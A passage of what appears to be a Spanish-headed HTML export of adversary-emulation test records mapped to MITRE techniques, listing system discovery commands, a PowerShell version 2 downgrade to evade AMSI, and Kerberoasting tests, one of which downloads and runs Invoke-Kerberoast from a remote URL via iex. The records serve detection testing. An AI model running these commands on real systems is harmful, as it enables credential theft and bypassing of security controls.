<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 70e13ef4-5a74-47e4-9d16-760b41b0e2db</li>
<li><strong>name</strong>: operating system discovery </li>
<li><strong>description</strong>: operating system discovery using get-ciminstance
https://petri.com/getting-operating-system-information-powershell/</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1082</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ce479c1a-e8fa-42b2-812a-96b0f2f4d28a</li>
<li><strong>name</strong>: Identify System Locale and Regional Settings with PowerShell</li>
<li>
<p><strong>description</strong>: This action demonstrates how an attacker might gather a system's region and language settings using PowerShell, which could aid in profiling 
the machine's location and user language preferences. The command outputs system locale details to a temporary file for further analysis.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: powershell.exe -c "Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: cmd.exe /c del "%TMP%\a.txt"</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1082</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c187c9bc-4511-40b3-aa10-487b2c70b6a5</li>
<li><strong>name</strong>: Enumerate Available Drives via gdr</li>
<li>
<p><strong>description</strong>: This test simulates an attacker attempting to list the available drives on the system to gather data about file storage locations.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: powershell.exe -c "gdr -PSProvider 'FileSystem'"</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1082</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 47c96489-2f55-4774-a6df-39faff428f6f</li>
<li><strong>name</strong>: PowerShell Version 2 Downgrade</li>
<li><strong>description</strong>: Executes outdated PowerShell Version 2 which does not support security features like AMSI. By default the atomic will attempt to execute the cmdlet Invoke-Mimikatz whether it exists or not, as this cmdlet will be blocked by AMSI when active.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: PowerShell -version 2 -command '#{v2_command}'</li>
<li>
<p><strong>prereq_command</strong>: $v2_installed = PowerShell -version 2 -command '$PSVersionTable.PSVersion.Major'
if (-not $v2_installed) {exit 1} else {exit 0}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: echo "Manually install PowerShell Version 2"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1562.010</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 51f17016-d8fa-4360-888a-df4bf92c4a04</li>
<li><strong>name</strong>: Get-Service Execution</li>
<li><strong>description</strong>: Executes the Get-Service cmdlet to gather objects representing all services on the local system.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: powershell.exe Get-Service</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1007</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3f987809-3681-43c8-bcd8-b3ff3a28533a</li>
<li><strong>name</strong>: Request for service tickets</li>
<li>
<p><strong>description</strong>: This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1
The following are further sources and credits for this attack:
[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
when executed successfully , the test displays available services with their hashes. 
If the testing domain doesn't have any service principal name configured, there is no output</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
Invoke-Kerberoast | fl</p>
</li>
<li>
<p><strong>prereq_command</strong>: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Write-Host Joining this computer to a domain must be done manually</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1558.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 988539bc-2ed7-4e62-aec6-7c5cf6680863</li>
<li><strong>name</strong>: Request A Single Ticket via PowerShell</li>
<li>
<p><strong>description</strong>: The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. 
A successful execution will output the SPNs for the endpoint in question.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Add-Type -AssemblyName System.IdentityModel
$ComputerFQDN=$env:LogonServer.trimStart('\') + "." + $env:UserDnsDomain
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/$ComputerFQDN" </p>
</li>
<li>
<p><strong>prereq_command</strong>: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Write-Host Joining this computer to a domain must be done manually</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1558.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
